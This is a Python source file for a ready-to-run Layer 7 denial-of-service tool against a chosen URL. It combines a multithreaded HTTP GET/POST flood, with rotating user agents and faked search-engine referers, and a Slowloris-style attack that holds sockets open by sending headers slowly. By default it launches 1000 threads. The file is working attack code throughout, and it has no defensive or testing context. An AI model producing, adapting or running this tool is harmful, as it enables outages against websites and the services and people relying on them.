import random
import threading
import requests
import socket
import time

class Layer7Attack:
    def __init__(self, target_url, vectors='all'):
        self.target_url = target_url
        self.vectors = vectors
        self.running = False
        self.threads = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        self.referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/'
        ]

    def http_flood(self):
        """HTTP GET/POST flood"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Referer': random.choice(self.referers)
        }
        
        while self.running:
            try:
                if random.random() > 0.5:
                    requests.get(self.target_url, headers=headers, timeout=5)
                else:
                    requests.post(self.target_url, headers=headers, timeout=5)
            except:
                pass

    def slow_headers(self):
        """Slow headers attack"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            parsed = requests.utils.urlparse(self.target_url)
            host = parsed.netloc.split(':')[0]
            port = parsed.port if parsed.port else 80
            
            s.connect((host, port))
            s.send(f"GET {parsed.path or '/'} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            
            while self.running:
                header = f"X-a: {random.randint(1,5000)}\r\n"
                s.send(header.encode())
                time.sleep(random.uniform(1, 5))
        except:
            pass
        finally:
            s.close()

    def start(self, threads=1000):
        """Start Layer7 attack"""
        self.running = True
        
        # Distribute threads between attack vectors
        if self.vectors == 'all' or 'http' in self.vectors:
            for _ in range(threads // 2):
                t = threading.Thread(target=self.http_flood)
                t.daemon = True
                t.start()
                self.threads.append(t)
        
        if self.vectors == 'all' or 'slow' in self.vectors:
            for _ in range(threads // 2):
                t = threading.Thread(target=self.slow_headers)
                t.daemon = True
                t.start()
                self.threads.append(t)

    def stop(self):
        """Stop Layer7 attack"""
        self.running = False
        for t in self.threads:
            t.join()
